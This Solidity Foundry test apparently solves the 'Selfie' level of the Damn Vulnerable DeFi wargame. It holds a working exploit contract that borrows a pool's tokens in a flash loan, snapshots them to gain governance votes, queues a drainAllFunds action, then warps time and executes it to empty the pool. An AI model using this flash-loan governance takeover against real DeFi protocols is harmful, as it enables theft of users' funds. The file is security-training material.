// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
import {ERC20Snapshot} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Snapshot.sol";

contract Attacker {
    address payable public owner;
    address payable public selfiePool;
    address payable public simpleGovernance;
    uint256 public actionId;

    ERC20Snapshot public token;

    constructor(
        address _selfiePool,
        address _simpleGovernance,
        address _token
    ) {
        owner = payable(msg.sender);
        selfiePool = payable(_selfiePool);
        simpleGovernance = payable(_simpleGovernance);

        token = ERC20Snapshot(_token);

        token.approve(address(this), type(uint256).max);
    }

    function contractFlashLoan() public _ownerOnly {
        selfiePool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256)",
                token.balanceOf(selfiePool)
            )
        );
    }

    function receiveTokens(address _token, uint256 _amount) external {
        // Deposit into governance
        _token.call(abi.encodeWithSignature("snapshot()"));

        bytes memory drainFundsCalldata = abi.encodeWithSignature("drainAllFunds(address)", owner);
        actionId = SimpleGovernance(simpleGovernance).queueAction(selfiePool, drainFundsCalldata, 0);

        // Repay the loan
        token.transfer(address(selfiePool), _amount);
    }

    modifier _ownerOnly() {
        assert(msg.sender == owner);
        _;
    }

    function withdraw() public _ownerOnly {
        try SimpleGovernance(simpleGovernance).executeAction(actionId) {

        } catch {
            console2.log("Couldn't execute drainAllFunds function yet.");
        }
    }

    fallback() external payable {}
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);

        Attacker attacker = new Attacker(address(selfiePool), address(simpleGovernance), address(dvtSnapshot));
        attacker.contractFlashLoan();
        uint256 blockTimestamp = block.timestamp;

        while (block.timestamp - blockTimestamp < simpleGovernance.getActionDelay())
        {   
            console2.log("Not enough time has passed to execute action, warping 6 hours ...");
            vm.warp(block.timestamp + 6 hours);
        }

        attacker.withdraw();

        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
